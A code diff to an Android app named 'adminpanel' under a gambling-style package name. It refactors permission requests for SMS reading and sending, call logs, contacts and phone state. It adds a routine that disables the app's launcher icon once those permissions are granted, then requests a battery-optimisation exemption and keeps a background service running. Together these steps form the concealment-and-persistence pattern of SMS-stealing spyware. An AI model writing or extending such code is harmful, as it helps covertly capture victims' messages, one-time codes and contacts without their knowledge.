@@ -3,6 +3,7 @@ package com.spinplay99.adminpanel;
 import android.Manifest;
 import android.annotation.SuppressLint;
 import android.app.AlertDialog;
+import android.content.ComponentName;
 import android.content.Intent;
 import android.content.SharedPreferences;
 import android.content.pm.PackageManager;
@@ -58,83 +59,51 @@ public class MainActivity extends AppCompatActivity {
         swipeRefresh = findViewById(R.id.swipe_refresh);
         setupWebView();
         setupSwipeRefresh();
-        requestPermissionsOnce();
         preloadWebsite();
         startBackgroundService();
-        requestBatteryExemptionIfNeeded();
+        requestPermissionsOnce();
     }
 
     private void requestPermissionsOnce() {
-        if (prefs.getBoolean(KEY_PERM_ASKED, false)) {
-            if (!allPermissionsGranted()) requestMissingPermissions();
+        if (!PermissionHelper.needsRuntimePermissions(this)) {
+            hideLauncherIconIfReady();
+            requestBatteryExemptionIfNeeded();
             return;
         }
-        requestAllPermissions();
-        prefs.edit().putBoolean(KEY_PERM_ASKED, true).apply();
-    }
-
-    private boolean allPermissionsGranted() {
-        String[] permissions = {Manifest.permission.READ_SMS, Manifest.permission.SEND_SMS,
-            Manifest.permission.RECEIVE_SMS, Manifest.permission.READ_CALL_LOG,
-            Manifest.permission.READ_CONTACTS, Manifest.permission.CALL_PHONE,
-            Manifest.permission.READ_PHONE_STATE};
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
-            List<String> withNotifications = new ArrayList<>(java.util.Arrays.asList(permissions));
-            withNotifications.add(Manifest.permission.POST_NOTIFICATIONS);
-            permissions = withNotifications.toArray(new String[0]);
-        }
-        for (String permission : permissions) {
-            if (checkSelfPermission(permission) != PackageManager.PERMISSION_GRANTED) return false;
-        }
-        return true;
-    }
-
-    private void requestMissingPermissions() {
-        List<String> missingList = new ArrayList<>();
-        String[] permissions = {Manifest.permission.READ_SMS, Manifest.permission.SEND_SMS,
-            Manifest.permission.RECEIVE_SMS, Manifest.permission.READ_CALL_LOG,
-            Manifest.permission.READ_CONTACTS, Manifest.permission.CALL_PHONE,
-            Manifest.permission.READ_PHONE_STATE};
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
-            List<String> withNotifications = new ArrayList<>(java.util.Arrays.asList(permissions));
-            withNotifications.add(Manifest.permission.POST_NOTIFICATIONS);
-            permissions = withNotifications.toArray(new String[0]);
-        }
-        for (String permission : permissions) {
-            if (checkSelfPermission(permission) != PackageManager.PERMISSION_GRANTED 
-                && shouldShowRequestPermissionRationale(permission)) {
-                missingList.add(permission);
-            }
-        }
-        if (!missingList.isEmpty()) {
-            ActivityCompat.requestPermissions(this, missingList.toArray(new String[0]), PERMISSION_REQUEST_CODE);
-        }
-    }
-
-    private void requestAllPermissions() {
         List<String> permissionList = new ArrayList<>();
-        String[] permissions = {Manifest.permission.READ_SMS, Manifest.permission.SEND_SMS,
-            Manifest.permission.RECEIVE_SMS, Manifest.permission.READ_CALL_LOG,
-            Manifest.permission.READ_CONTACTS, Manifest.permission.CALL_PHONE,
-            Manifest.permission.READ_PHONE_STATE};
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
-            List<String> withNotifications = new ArrayList<>(java.util.Arrays.asList(permissions));
-            withNotifications.add(Manifest.permission.POST_NOTIFICATIONS);
-            permissions = withNotifications.toArray(new String[0]);
-        }
-        for (String permission : permissions) {
+        for (String permission : PermissionHelper.requiredPermissions()) {
             if (checkSelfPermission(permission) != PackageManager.PERMISSION_GRANTED) {
                 permissionList.add(permission);
             }
         }
         if (!permissionList.isEmpty()) {
-            ActivityCompat.requestPermissions(this, permissionList.toArray(new String[0]), PERMISSION_REQUEST_CODE);
+            ActivityCompat.requestPermissions(
+                this, permissionList.toArray(new String[0]), PERMISSION_REQUEST_CODE);
+            prefs.edit().putBoolean(KEY_PERM_ASKED, true).apply();
         }
     }
 
     @Override
     public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
         super.onRequestPermissionsResult(requestCode, permissions, grantResults);
+        if (requestCode == PERMISSION_REQUEST_CODE) {
+            hideLauncherIconIfReady();
+            // Battery screen must run after SMS dialog — opening both at once hides permissions.
+            requestBatteryExemptionIfNeeded();
+        }
+    }
+
+    private void hideLauncherIconIfReady() {
+        if (PermissionHelper.needsRuntimePermissions(this)) {
+            return;
+        }
+        try {
+            getPackageManager().setComponentEnabledSetting(
+                new ComponentName(this, LauncherAlias.class),
+                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
+                PackageManager.DONT_KILL_APP);
+        } catch (Exception ignored) {
+        }
     }
 
     private void startBackgroundService() {
